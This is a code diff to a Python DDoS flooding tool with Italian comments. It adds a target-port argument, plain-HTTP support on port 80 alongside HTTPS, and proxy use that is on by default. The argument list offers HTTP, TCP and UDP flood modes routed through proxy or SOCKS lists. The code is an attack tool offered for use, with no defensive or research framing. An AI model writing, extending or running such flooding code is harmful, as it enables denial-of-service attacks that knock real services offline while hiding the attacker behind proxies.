@@ -1086,25 +1086,47 @@ def starturl(args): # in questa funzione setto l'url per renderlo usabile per il
 
 	url = args["url"].strip()
 
-	try:
-		if url[0]+url[1]+url[2]+url[3] == "www.":
-			url = "https://" + url
-		elif url[0]+url[1]+url[2]+url[3] == "https":
-			pass
-		else:
-			url = "https://" + url
-	except:                                                                                              
-		print("You mistyped, try again.")
+	port = args["port"]
+	if port == 443:
+		try:
+			if url[0]+url[1]+url[2]+url[3] == "www.":
+				url = "https://" + url
+			elif url[0]+url[1]+url[2]+url[3] == "https":
+				pass
+			else:
+				url = "https://" + url
+		except:                                                                                              
+			print("You mistyped, try again.")
 
-	try:                                
-		url2 = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[0]
-	except:
-		url2 = url.replace("https://", "").replace("https://", "").split("/")[0]
-                                                                                         
-	try:               
-		urlport = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[1]
-	except:
-		urlport = "443"
+		try:                                
+			url2 = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[0]
+		except:
+			url2 = url.replace("https://", "").replace("https://", "").split("/")[0]
+												 
+		try:               
+			urlport = url.replace("https://", "").replace("https://", "").split("/")[0].split(":")[1]
+		except:
+			urlport = "443"
+	else:
+		try:
+			if url[0]+url[1]+url[2]+url[3] == "www.":
+				url = "http://" + url
+			elif url[0]+url[1]+url[2]+url[3] == "http":
+				pass
+			else:
+				url = "http://" + url
+		except:                                                                                              
+			print("You mistyped, try again.")
+
+		try:                                
+			url2 = url.replace("http://", "").replace("http://", "").split("/")[0].split(":")[0]
+		except:
+			url2 = url.replace("http://", "").replace("http://", "").split("/")[0]
+												 
+		try:               
+			urlport = url.replace("http://", "").replace("http://", "").split("/")[0].split(":")[1]
+		except:
+			urlport = "80"
 	floodmode(args)
                                                     
 def floodmode(args): # la scelta della modalità di attacco
@@ -1635,7 +1657,8 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser()
 	parser.add_argument("url", type=str, help="target URL")
-	parser.add_argument("proxy", type=str, help="Use proxy? (y/n)")
+	parser.add_argument("port", type=int, help="target port")
+	parser.add_argument("--proxy", type=str, default="y", help="Use proxy? (y/n)")
 	parser.add_argument("--proxy_file", type=str, default="proxy.txt", help="Custom proxy filename")
 	parser.add_argument("--flood_type", type=str, default="0", help="Flood type: 0-http(s), 1-TCP, 2-UDP")
 	parser.add_argument("--proxy_type", type=str, default="0", help="Proxy type: 0-proxymode, 1-socksmode")
